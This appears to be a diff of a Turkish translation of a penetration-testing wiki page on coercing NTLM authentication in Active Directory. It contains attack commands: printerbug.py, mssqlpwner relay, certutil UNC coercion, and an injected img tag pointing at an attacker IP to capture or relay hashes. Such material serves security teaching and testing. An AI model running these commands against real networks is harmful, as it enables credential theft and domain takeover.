@@ -8,7 +8,7 @@
 
 ## Spooler Servisi İstismarı
 
-Eğer _**Print Spooler**_ servisi **etkinse**, bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi'nin yazıcı sunucusuna yeni yazdırma işleri hakkında bir **güncelleme** **talep** edebilir ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
+Eğer _**Print Spooler**_ servisi **etkinse**, bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi’nin yazıcı sunucusuna yeni yazdırma işleri hakkında bir **güncelleme** **talep** edebilir ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
 Yazıcı, bildirimi rastgele sistemlere gönderdiğinde, o **sistem** ile **kimlik doğrulaması yapması** gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ servisini rastgele bir sistemle kimlik doğrulaması yapacak şekilde yönlendirebilir ve hizmet bu kimlik doğrulamasında **bilgisayar hesabını** **kullanacaktır**.
 
 ### Alan üzerindeki Windows Sunucularını Bulma
@@ -17,7 +17,7 @@ PowerShell kullanarak, Windows kutularının bir listesini alın. Sunucular gene
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Spooler hizmetlerini dinleyenleri bulma
+### Spooler hizmetlerini dinleyen bulma
 
 Biraz değiştirilmiş @mysmartlogin'in (Vincent Le Toux'un) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) aracını kullanarak, Spooler Hizmetinin dinleyip dinlemediğini kontrol edin:
 ```bash
@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Unconstrained Delegation ile Birleştirme
 
-Eğer bir saldırgan [Unconstrained Delegation](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Unconstrained delegation nedeniyle, **yazıcının bilgisayar hesabının TGT'si** unconstrained delegation ile bilgisayarın **belleğinde** **saklanacaktır**. Saldırgan bu hostu zaten ele geçirdiği için, **bu bileti alabilir** ve kötüye kullanabilir ([Pass the Ticket](pass-the-ticket.md)).
+Eğer bir saldırgan [Unconstrained Delegation](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Kısıtlanmamış delegasyon nedeniyle, **yazıcının bilgisayar hesabının TGT'si** kısıtlanmamış delegasyona sahip bilgisayarın **belleğinde** **saklanacaktır**. Saldırgan bu ana bilgisayarı zaten ele geçirdiği için, **bu bileti alabilir** ve kötüye kullanabilir ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP Zorla Kimlik Doğrulama
 
@@ -51,9 +51,9 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, herhangi bir posta kutusuna sahip alan kullanıcısının Exchange sunucusunu HTTP üzerinden herhangi bir istemci sağlanan hosta kimlik doğrulaması yapmaya zorlamasına olanak tanır.
+`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, Exchange sunucusunun, bir posta kutusuna sahip herhangi bir alan kullanıcısı tarafından HTTP üzerinden herhangi bir istemci sağlanan ana bilgisayara kimlik doğrulaması yapmaya zorlanmasını sağlar.
 
-Varsayılan olarak, **Exchange servisi SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019'dan önceki Kümülatif Güncelleme üzerinde WriteDacl ayrıcalıklarına sahiptir**). Bu hata, **LDAP'ye bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için sömürülebilir. LDAP'ye iletim mümkün olmadığında bile, bu hata alan içindeki diğer hostlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde sömürülmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Alan Yöneticisi'ne anında erişim sağlar.
+Varsayılan olarak, **Exchange hizmeti SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019'dan önceki Kümülatif Güncelleme üzerinde WriteDacl ayrıcalıklarına sahiptir**). Bu hata, **LDAP'ye bilgi iletimine izin vermek ve ardından alan NTDS veritabanını çıkarmak** için sömürülebilir. LDAP'ye iletim mümkün olmadığında bile, bu hata alan içindeki diğer ana bilgisayarlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde sömürülmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Alan Yöneticisi'ne anında erişim sağlar.
 
 ## Windows İçinde
 
@@ -78,11 +78,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-
 # Issuing NTLM relay attack on the local server with custom command
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
-Ya da bu diğer tekniği kullanın: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
-NTLM kimlik doğrulamasını zorlamak için certutil.exe lolbin (Microsoft imzalı ikili) kullanmak mümkündür:
+certutil.exe lolbin (Microsoft imzalı ikili) kullanarak NTLM kimlik doğrulamasını zorlamak mümkündür:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
@@ -98,11 +98,12 @@ ve açtığında, kimlik doğrulamaya çalışacaktır.
 
 ### MitM
 
-Eğer bir bilgisayara MitM saldırısı gerçekleştirebilirseniz ve onun göreceği bir sayfaya HTML enjekte ederseniz, sayfaya aşağıdaki gibi bir resim enjekte etmeyi deneyebilirsiniz:
+Eğer bir bilgisayara MitM saldırısı gerçekleştirebilir ve bir sayfaya HTML enjekte edebilirseniz, sayfada aşağıdaki gibi bir resmi enjekte etmeyi deneyebilirsiniz:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
 ## NTLM kimlik doğrulamasını zorlamak ve oltalama için diğer yollar
+
 
 {{#ref}}
 ../ntlm/places-to-steal-ntlm-creds.md
